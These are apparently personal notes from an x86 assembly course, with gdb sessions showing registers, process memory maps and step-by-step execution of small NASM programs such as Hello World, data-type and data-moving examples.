IA-32 Architecture:

https://i.imgur.com/Mr9pvq9.jpg

gdb /bin/bash
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /bin/bash...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x805eba6
(gdb) run 
Starting program: /bin/bash 

Breakpoint 1, 0x0805eba6 in main ()
(gdb) info registers
eax            0x1	1
ecx            0xbffff774	-1073744012
edx            0xbffff704	-1073744124
ebx            0xb7fa1ff4	-1208344588
esp            0xbffff6cc	0xbffff6cc
ebp            0xbffff6d8	0xbffff6d8
esi            0x0	0
edi            0x0	0
eip            0x805eba6	0x805eba6 <main+6>
eflags         0x246	[ PF ZF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) display /x $eax
1: /x $eax = 0x1
(gdb) display /x $ax
2: /x $ax = 0x1
(gdb) display /x $ecx
3: /x $ecx = 0xbffff774
(gdb) display /x $cx
4: /x $cx = 0xf774
(gdb) display /x $ch
5: /x $ch = 0xf7
(gdb) display /x $cl
6: /x $cl = 0x74
(gdb) info all-registers 
eax            0x1	1
ecx            0xbffff774	-1073744012
edx            0xbffff704	-1073744124
ebx            0xb7fa1ff4	-1208344588
esp            0xbffff6cc	0xbffff6cc
ebp            0xbffff6d8	0xbffff6d8
esi            0x0	0
edi            0x0	0
eip            0x805eba6	0x805eba6 <main+6>
eflags         0x246	[ PF ZF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
st0            0	(raw 0x00000000000000000000)
st1            0	(raw 0x00000000000000000000)
st2            0	(raw 0x00000000000000000000)
st3            0	(raw 0x00000000000000000000)
st4            0	(raw 0x00000000000000000000)
st5            0	(raw 0x00000000000000000000)
st6            0	(raw 0x00000000000000000000)
st7            0	(raw 0x00000000000000000000)
fctrl          0x37f	895
fstat          0x0	0
ftag           0xffff	65535
fiseg          0x0	0
fioff          0x0	0
foseg          0x0	0
fooff          0x0	0
fop            0x0	0
mxcsr          0x1f80	[ IM DM ZM OM UM PM ]
ymm0           {v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, v16_int16 = {0x0 <repeats 16 times>}, v8_int32 = {0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0}, v4_int64 = {0x0, 0x0, 0x0, 0x0}, v2_int128 = {
    0x00000000000000000000000000000000, 0x00000000000000000000000000000000}}
ymm1           {v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, v16_int16 = {0x0 <repeats 16 times>}, v8_int32 = {0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0}, v4_int64 = {0x0, 0x0, 0x0, 0x0}, v2_int128 = {
    0x00000000000000000000000000000000, 0x00000000000000000000000000000000}}
ymm2           {v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, v16_int16 = {0x0 <repeats 16 times>}, v8_int32 = {0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0}, v4_int64 = {0x0, 0x0, 0x0, 0x0}, v2_int128 = {
    0x00000000000000000000000000000000, 0x00000000000000000000000000000000}}
ymm3           {v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, v16_int16 = {0x0 <repeats 16 times>}, v8_int32 = {0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0}, v4_int64 = {0x0, 0x0, 0x0, 0x0}, v2_int128 = {
    0x00000000000000000000000000000000, 0x00000000000000000000000000000000}}
ymm4           {v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, v16_int16 = {0x0 <repeats 16 times>}, v8_int32 = {0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0}, v4_int64 = {0x0, 0x0, 0x0, 0x0}, v2_int128 = {
    0x00000000000000000000000000000000, 0x00000000000000000000000000000000}}
ymm5           {v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, v16_int16 = {0x0 <repeats 16 times>}, v8_int32 = {0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0}, v4_int64 = {0x0, 0x0, 0x0, 0x0}, v2_int128 = {
---Type <return> to continue, or q <return> to quit---
    0x00000000000000000000000000000000, 0x00000000000000000000000000000000}}
ymm6           {v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, v16_int16 = {0x0 <repeats 16 times>}, v8_int32 = {0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0}, v4_int64 = {0x0, 0x0, 0x0, 0x0}, v2_int128 = {
    0x00000000000000000000000000000000, 0x00000000000000000000000000000000}}
ymm7           {v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, v16_int16 = {0x0 <repeats 16 times>}, v8_int32 = {0x0, 0x0, 0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0}, v4_int64 = {0x0, 0x0, 0x0, 0x0}, v2_int128 = {
    0x00000000000000000000000000000000, 0x00000000000000000000000000000000}}
mm0            {uint64 = 0x0, v2_int32 = {0x0, 0x0}, v4_int16 = {0x0, 0x0, 0x0, 0x0}, v8_int8 = {0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}}
mm1            {uint64 = 0x0, v2_int32 = {0x0, 0x0}, v4_int16 = {0x0, 0x0, 0x0, 0x0}, v8_int8 = {0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}}
mm2            {uint64 = 0x0, v2_int32 = {0x0, 0x0}, v4_int16 = {0x0, 0x0, 0x0, 0x0}, v8_int8 = {0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}}
mm3            {uint64 = 0x0, v2_int32 = {0x0, 0x0}, v4_int16 = {0x0, 0x0, 0x0, 0x0}, v8_int8 = {0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}}
mm4            {uint64 = 0x0, v2_int32 = {0x0, 0x0}, v4_int16 = {0x0, 0x0, 0x0, 0x0}, v8_int8 = {0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}}
mm5            {uint64 = 0x0, v2_int32 = {0x0, 0x0}, v4_int16 = {0x0, 0x0, 0x0, 0x0}, v8_int8 = {0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}}
mm6            {uint64 = 0x0, v2_int32 = {0x0, 0x0}, v4_int16 = {0x0, 0x0, 0x0, 0x0}, v8_int8 = {0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}}
mm7            {uint64 = 0x0, v2_int32 = {0x0, 0x0}, v4_int16 = {0x0, 0x0, 0x0, 0x0}, v8_int8 = {0x0, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}}
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0805eba0 <+0>:	push   ebp
   0x0805eba1 <+1>:	mov    ebp,esp
   0x0805eba3 <+3>:	push   edi
   0x0805eba4 <+4>:	push   esi
   0x0805eba5 <+5>:	push   ebx
=> 0x0805eba6 <+6>:	and    esp,0xfffffff0

CPU Modes and Memory Management:

cat /proc/pid/maps
pmap -d pid
gdb /bin/bash
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /bin/bash...(no debugging symbols found)...done.
(gdb) info proc mappings
No current process: you must name one.
(gdb) break main
Breakpoint 1 at 0x805eba6
(gdb) run
Starting program: /bin/bash 

Breakpoint 1, 0x0805eba6 in main ()
(gdb) info proc mappings
process 6099
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8124000    0xdc000        0x0 /bin/bash
	 0x8124000  0x8125000     0x1000    0xdb000 /bin/bash
	 0x8125000  0x812a000     0x5000    0xdc000 /bin/bash
	 0x812a000  0x812f000     0x5000        0x0 [heap]
	0xb7dfa000 0xb7dfb000     0x1000        0x0 
	0xb7dfb000 0xb7f9f000   0x1a4000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7f9f000 0xb7fa0000     0x1000   0x1a4000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fa0000 0xb7fa2000     0x2000   0x1a4000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fa2000 0xb7fa3000     0x1000   0x1a6000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fa3000 0xb7fa7000     0x4000        0x0 
	0xb7fa7000 0xb7faa000     0x3000        0x0 /lib/i386-linux-gnu/libdl-2.15.so
	0xb7faa000 0xb7fab000     0x1000     0x2000 /lib/i386-linux-gnu/libdl-2.15.so
	0xb7fab000 0xb7fac000     0x1000     0x3000 /lib/i386-linux-gnu/libdl-2.15.so
	0xb7fac000 0xb7fc8000    0x1c000        0x0 /lib/i386-linux-gnu/libtinfo.so.5.9
	0xb7fc8000 0xb7fca000     0x2000    0x1b000 /lib/i386-linux-gnu/libtinfo.so.5.9
	0xb7fca000 0xb7fcb000     0x1000    0x1d000 /lib/i386-linux-gnu/libtinfo.so.5.9
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]

Hello World:

vim HelloWorld.asm

; HelloWorld.asm 
; Author: Vivek Ramachandran



global _start

section .text

_start:

        ; print hello world on the screen

        mov eax, 0x4
        mov ebx, 0x1
        mov ecx, message
        mov edx, mlen
        int 0x80


        ; exit the program gracefully

        mov eax, 0x1
        mov ebx, 0x5
        int 0x80



section .data

        message: db "Hello World!"
        mlen    equ  $-message

nasm -f elf32 -o HelloWorld.o HelloWorld.asm (Assemble)
ld -o HelloWorld HelloWorld.o (Link)
echo $? (Display return value)
5

HelloWorld GDB:

gdb ./HelloWorld 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /SLAE x86/HelloWorld/HelloWorld...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run 
Starting program: /SLAE x86/HelloWorld/HelloWorld 

Breakpoint 1, 0x08048080 in _start ()
(gdb) set disassembly-flavor intel
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490a4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	mov    eax,0x1
   0x0804809b <+27>:	mov    ebx,0x5
   0x080480a0 <+32>:	int    0x80
End of assembler dump.
(gdb) info registers
eax            0x0	0
ecx            0x0	0
edx            0x0	0
ebx            0x0	0
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x8048080	0x8048080 <_start>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) stepi
0x08048085 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x4
=> 0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490a4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	mov    eax,0x1
   0x0804809b <+27>:	mov    ebx,0x5
   0x080480a0 <+32>:	int    0x80
End of assembler dump.
(gdb) info registers
eax            0x4	4
ecx            0x0	0
edx            0x0	0
ebx            0x0	0
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x8048085	0x8048085 <_start+5>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) stepi
0x0804808a in _start ()
(gdb) info registers
eax            0x4	4
ecx            0x0	0
edx            0x0	0
ebx            0x1	1
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x804808a	0x804808a <_start+10>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) disassemble 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
=> 0x0804808a <+10>:	mov    ecx,0x80490a4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	mov    eax,0x1
   0x0804809b <+27>:	mov    ebx,0x5
   0x080480a0 <+32>:	int    0x80
End of assembler dump.
(gdb) x/s 0x80490a4
0x80490a4 <message>:	 "Hello World!"
(gdb) stepi
0x0804808f in _start ()
(gdb) info registers
eax            0x4	4
ecx            0x80490a4	134516900
edx            0x0	0
ebx            0x1	1
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x804808f	0x804808f <_start+15>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) stepi
0x08048094 in _start ()
(gdb) info registers
eax            0x4	4
ecx            0x80490a4	134516900
edx            0xc	12
ebx            0x1	1
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x8048094	0x8048094 <_start+20>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) disassemble 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490a4
   0x0804808f <+15>:	mov    edx,0xc
=> 0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	mov    eax,0x1
   0x0804809b <+27>:	mov    ebx,0x5
   0x080480a0 <+32>:	int    0x80
End of assembler dump.
(gdb) stepi
Hello World!0x08048096 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490a4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
=> 0x08048096 <+22>:	mov    eax,0x1
   0x0804809b <+27>:	mov    ebx,0x5
   0x080480a0 <+32>:	int    0x80
End of assembler dump.
(gdb) info registers
eax            0xc	12
ecx            0x80490a4	134516900
edx            0xc	12
ebx            0x1	1
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x8048096	0x8048096 <_start+22>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) stepi
0x0804809b in _start ()
(gdb) info registers
eax            0x1	1
ecx            0x80490a4	134516900
edx            0xc	12
ebx            0x1	1
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x804809b	0x804809b <_start+27>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) disassemble 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490a4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	mov    eax,0x1
=> 0x0804809b <+27>:	mov    ebx,0x5
   0x080480a0 <+32>:	int    0x80
End of assembler dump.
(gdb) stepi
0x080480a0 in _start ()
(gdb) info registers
eax            0x1	1
ecx            0x80490a4	134516900
edx            0xc	12
ebx            0x5	5
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x80480a0	0x80480a0 <_start+32>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) disassemble 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490a4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	mov    eax,0x1
   0x0804809b <+27>:	mov    ebx,0x5
=> 0x080480a0 <+32>:	int    0x80
End of assembler dump.
(gdb) stepi
[Inferior 1 (process 8672) exited with code 05]

Data Types:

Byte - 8 bits
Word - 16 bits
Double Word - 32 bits
Quad Word - 64 bits
Double Quad Word - 128 bits

Accessing Memory Reference with []
message db 0xAA, 0xBB, 0xCC, 0xDD (db = define bytes)
mov eax, message <- moves address into eax
mov eax, [message] <- moves value into eax

Declare Uninitialized Data
resb 64 (reserve 64 bytes)
resw 1 (reserve a word)

vim DataTypes.nasm
; DataTypes.nasm
; Author: Vivek Ramachandran



global _start

section .text

_start:

        ; print hello world on the screen

        mov eax, 0x4
        mov ebx, 0x1
        mov ecx, message
        mov edx, mlen
        int 0x80

        ; exit the program gracefully

        mov eax, 0x1
        mov ebx, 0x5
        int 0x80



section .data

        var1:   db 0xAA
        var2:   db 0xBB, 0xCC, 0xDD
        var3:   dw 0xEE
        var4:   dd 0xAABBCCDD
        var5:   dd 0x112233
        var6:   TIMES 6 db 0xFF

        message: db "Hello World!"
        mlen    equ  $-message


section .bss

        var7:   resb 100
        var8:   resw 20
	
cat compile.sh 
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'

./compile.sh  DataTypes
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!

gdb -q ./DataTypes
Reading symbols from /SLAE x86/DataTypes/DataTypes...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048080  _start
(gdb) shell readelf -h DataTypes
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048080
  Start of program headers:          52 (bytes into file)
  Start of section headers:          240 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         2
  Size of section headers:           40 (bytes)
  Number of section headers:         7
  Section header string table index: 4
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) set disassembly-flavor intel
(gdb) run
Starting program: /SLAE x86/DataTypes/DataTypes 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490b8
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	mov    eax,0x1
   0x0804809b <+27>:	mov    ebx,0x5
   0x080480a0 <+32>:	int    0x80
End of assembler dump.
(gdb) info variables
All defined variables:

Non-debugging symbols:
0x080490a4  var1
0x080490a5  var2
0x080490a8  var3
0x080490aa  var4
0x080490ae  var5
0x080490b2  var6
0x080490b8  message
0x080490c4  var7
0x08049128  var8
(gdb) x/xb 0x080490a4
0x80490a4 <var1>:	0xaa
(gdb) x/xb &var1
0x80490a4 <var1>:	0xaa
(gdb) x/3xb &var2
0x80490a5 <var2>:	0xbb	0xcc	0xdd
(gdb) x/2xb &var3
0x80490a8 <var3>:	0xee	0x00
(gdb) print &var4
$1 = (<data variable, no debug info> *) 0x80490aa
(gdb) x/xb 0x80490aa
0x80490aa <var4>:	0xdd
(gdb) x/xb 0x80490ab
0x80490ab <var4+1>:	0xcc
(gdb) x/xb 0x80490ac
0x80490ac <var4+2>:	0xbb
(gdb) x/xb 0x80490ad
0x80490ad <var4+3>:	0xaa
(gdb) print &var5
$2 = (<data variable, no debug info> *) 0x80490ae
(gdb) x/xb 0x80490ae
0x80490ae <var5>:	0x33
(gdb) x/xb 0x80490af
0x80490af <var5+1>:	0x22
(gdb) x/xb 0x80490b0
0x80490b0 <var5+2>:	0x11
(gdb) x/xb &var6
0x80490b2 <var6>:	0xff

Moving Data:

vim MovingData.nasm 

; Filename: MovingData.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        ; mov immediate data to register

        mov eax, 0xaaaaaaaa
        mov al, 0xbb
        mov ah, 0xcc
        mov ax, 0xdddd

        mov ebx, 0
        mov ecx, 0

        ; mov register to register

        mov ebx, eax
        mov cl, al
        mov ch, ah
        mov cx, ax

        mov eax, 0
        mov ebx, 0
        mov ecx, 0

        ; mov from memory into register

        mov al, [sample]
        mov ah, [sample +1]
        mov bx, [sample]
        mov ecx, [sample]

        ; mov from register into memory


        mov eax, 0x33445566
        mov byte [sample], al
        mov word [sample], ax
        mov dword [sample], eax

        ; mov immediate value into memory

        mov dword [sample], 0x33445566

        ; lea demo

        lea eax, [sample]
        lea ebx, [eax]


        ; xchg demo
        mov eax, 0x11223344
        mov ebx, 0xaabbccdd

        xchg eax, ebx


        ; exit the program gracefully

        mov eax, 1
        mov ebx, 0
        int 0x80


section .data

sample: db 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11, 0x22

./compile.sh MovingData
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
gdb -q ./MovingData
Reading symbols from /SLAE x86/MovingData/MovingData...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /SLAE x86/MovingData/MovingData 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    eax,0xaaaaaaaa
   0x08048085 <+5>:	mov    al,0xbb
   0x08048087 <+7>:	mov    ah,0xcc
   0x08048089 <+9>:	mov    ax,0xdddd
   0x0804808d <+13>:	mov    ebx,0x0
   0x08048092 <+18>:	mov    ecx,0x0
   0x08048097 <+23>:	mov    ebx,eax
   0x08048099 <+25>:	mov    cl,al
   0x0804809b <+27>:	mov    ch,ah
   0x0804809d <+29>:	mov    cx,ax
   0x080480a0 <+32>:	mov    eax,0x0
   0x080480a5 <+37>:	mov    ebx,0x0
   0x080480aa <+42>:	mov    ecx,0x0
   0x080480af <+47>:	mov    al,ds:0x8049108
   0x080480b4 <+52>:	mov    ah,BYTE PTR ds:0x8049109
   0x080480ba <+58>:	mov    bx,WORD PTR ds:0x8049108
   0x080480c1 <+65>:	mov    ecx,DWORD PTR ds:0x8049108
   0x080480c7 <+71>:	mov    eax,0x33445566
   0x080480cc <+76>:	mov    ds:0x8049108,al
   0x080480d1 <+81>:	mov    ds:0x8049108,ax
   0x080480d7 <+87>:	mov    ds:0x8049108,eax
   0x080480dc <+92>:	mov    DWORD PTR ds:0x8049108,0x33445566
   0x080480e6 <+102>:	lea    eax,ds:0x8049108
   0x080480ec <+108>:	lea    ebx,[eax]
   0x080480ee <+110>:	mov    eax,0x11223344
   0x080480f3 <+115>:	mov    ebx,0xaabbccdd
   0x080480f8 <+120>:	xchg   ebx,eax
   0x080480f9 <+121>:	mov    eax,0x1
   0x080480fe <+126>:	mov    ebx,0x0
   0x08048103 <+131>:	int    0x80
End of assembler dump.
(gdb) x/8xb &sample
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>print /x $eax
>print /x $ebx
>print /x $ecx
>x/8xb &sample
>disassemble $eip,+10
>end
(gdb) disassemble $eip,+10
Dump of assembler code from 0x8048080 to 0x804808a:
=> 0x08048080 <_start+0>:	mov    eax,0xaaaaaaaa
   0x08048085 <_start+5>:	mov    al,0xbb
   0x08048087 <_start+7>:	mov    ah,0xcc
   0x08048089 <_start+9>:	mov    ax,0xdddd
End of assembler dump.
(gdb) nexti
$2 = 0xaaaaaaaa
$3 = 0x0
$4 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x8048085 to 0x804808f:
=> 0x08048085 <_start+5>:	mov    al,0xbb
   0x08048087 <_start+7>:	mov    ah,0xcc
   0x08048089 <_start+9>:	mov    ax,0xdddd
   0x0804808d <_start+13>:	mov    ebx,0x0
End of assembler dump.
0x08048085 in _start ()
(gdb) 
$5 = 0xaaaaaabb
$6 = 0x0
$7 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x8048087 to 0x8048091:
=> 0x08048087 <_start+7>:	mov    ah,0xcc
   0x08048089 <_start+9>:	mov    ax,0xdddd
   0x0804808d <_start+13>:	mov    ebx,0x0
End of assembler dump.
0x08048087 in _start ()
(gdb) 
$8 = 0xaaaaccbb
$9 = 0x0
$10 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x8048089 to 0x8048093:
=> 0x08048089 <_start+9>:	mov    ax,0xdddd
   0x0804808d <_start+13>:	mov    ebx,0x0
   0x08048092 <_start+18>:	mov    ecx,0x0
End of assembler dump.
0x08048089 in _start ()
(gdb) 
$11 = 0xaaaadddd
$12 = 0x0
$13 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x804808d to 0x8048097:
=> 0x0804808d <_start+13>:	mov    ebx,0x0
   0x08048092 <_start+18>:	mov    ecx,0x0
End of assembler dump.
0x0804808d in _start ()
(gdb) 
$14 = 0xaaaadddd
$15 = 0x0
$16 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x8048092 to 0x804809c:
=> 0x08048092 <_start+18>:	mov    ecx,0x0
   0x08048097 <_start+23>:	mov    ebx,eax
   0x08048099 <_start+25>:	mov    cl,al
   0x0804809b <_start+27>:	mov    ch,ah
End of assembler dump.
0x08048092 in _start ()
(gdb) 
$17 = 0xaaaadddd
$18 = 0x0
$19 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x8048097 to 0x80480a1:
=> 0x08048097 <_start+23>:	mov    ebx,eax
   0x08048099 <_start+25>:	mov    cl,al
   0x0804809b <_start+27>:	mov    ch,ah
   0x0804809d <_start+29>:	mov    cx,ax
   0x080480a0 <_start+32>:	mov    eax,0x0
End of assembler dump.
0x08048097 in _start ()
(gdb) 
$20 = 0xaaaadddd
$21 = 0xaaaadddd
$22 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x8048099 to 0x80480a3:
